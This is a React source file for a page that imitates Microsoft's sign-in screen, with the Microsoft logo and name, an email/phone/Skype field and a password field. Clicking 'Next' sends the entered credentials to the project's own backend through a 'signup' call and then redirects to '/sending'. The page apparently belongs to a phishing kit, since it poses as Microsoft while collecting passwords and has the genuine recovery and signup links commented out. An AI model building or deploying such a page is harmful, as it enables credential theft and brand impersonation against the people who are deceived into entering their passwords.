import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { signup } from "../api/auth.js";
import AuthLayout from "../components/AuthLayout.jsx";
import MicrosoftLogo from "../components/MicrosoftLogo.jsx";
import { useAuthFlow } from "../context/AuthFlowContext.jsx";

const inputBase = {
  width: "100%",
  fontSize: "15px",
  padding: "6px 1px 7px",
  border: "none",
  outline: "none",
  background: "transparent",
  color: "#1b1b1b",
  boxSizing: "border-box",
};

export default function SignInPage() {
  const navigate = useNavigate();
  const { email, setEmail, password, setPassword } = useAuthFlow();
  const [loading, setLoading] = useState(false);
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");

  const handleNext = async () => {
    let hasError = false;

    if (!email.trim()) {
      setEmailError("Enter an email address.");
      hasError = true;
    } else {
      setEmailError("");
    }

    if (!password.trim()) {
      setPasswordError("Enter a password.");
      hasError = true;
    } else {
      setPasswordError("");
    }

    if (hasError) return;

    try {
      setLoading(true);

      const data = await signup(email, password);

      if (data.success) {
        navigate("/sending");
      }
    } catch (error) {
      console.error(error);

      alert(
        error.response?.data?.message ||
          error.response?.data?.error ||
          "Unable to sign in. Please try again.",
      );
    } finally {
      setLoading(false);
    }
  };
  return (
    <AuthLayout showSignInOptions>
      <div
        style={{
          display: "flex",
          alignItems: "center",
          gap: "10px",
          marginBottom: "28px",
        }}
      >
        <MicrosoftLogo />
        <span style={{ fontSize: "21px", color: "#5e5e5e", fontWeight: 600 }}>
          Microsoft
        </span>
      </div>

      <h1
        style={{
          fontSize: "24px",
          fontWeight: 600,
          margin: "0 0 24px",
          color: "#1b1b1b",
        }}
      >
        Sign in
      </h1>

      <div style={{ marginBottom: "18px" }}>
        <input
          type="text"
          placeholder="Email, phone, or Skype"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          style={{
            ...inputBase,
            borderBottom: emailError ? "1px solid #d83b01" : "1px solid #666",
          }}
        />
        {emailError && (
          <div style={{ color: "#d83b01", fontSize: "13px", marginTop: "6px" }}>
            {emailError}
          </div>
        )}
      </div>

      <div style={{ marginBottom: "18px" }}>
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          style={{
            ...inputBase,
            borderBottom: passwordError
              ? "1px solid #d83b01"
              : "1px solid #666",
          }}
        />
        {passwordError && (
          <div style={{ color: "#d83b01", fontSize: "13px", marginTop: "6px" }}>
            {passwordError}
          </div>
        )}
      </div>

      {/* <div style={{ marginBottom: "8px", fontSize: "14.5px", color: "#1b1b1b" }}>
        No account?{" "}
        <a href="#" style={{ color: "#0067b8", textDecoration: "none" }}>
          Create one!
        </a>
      </div> */}

      {/* <div style={{ marginBottom: "32px" }}>
        <a href="#" style={{ color: "#0067b8", textDecoration: "none", fontSize: "14.5px" }}>
          Can't access your account?
        </a>
      </div> */}

      <div style={{ display: "flex", justifyContent: "flex-end", gap: "8px" }}>
        <button
          onClick={handleNext}
          disabled={loading}
          style={{
            background: "#0067b8",
            border: "none",
            color: "#fff",
            fontSize: "15px",
            padding: "9px 28px",
            cursor: loading ? "not-allowed" : "pointer",
            opacity: loading ? 0.7 : 1,
          }}
        >
          {loading ? "Signing in..." : "Next"}
        </button>
       
        
      </div>
    </AuthLayout>
  );
}
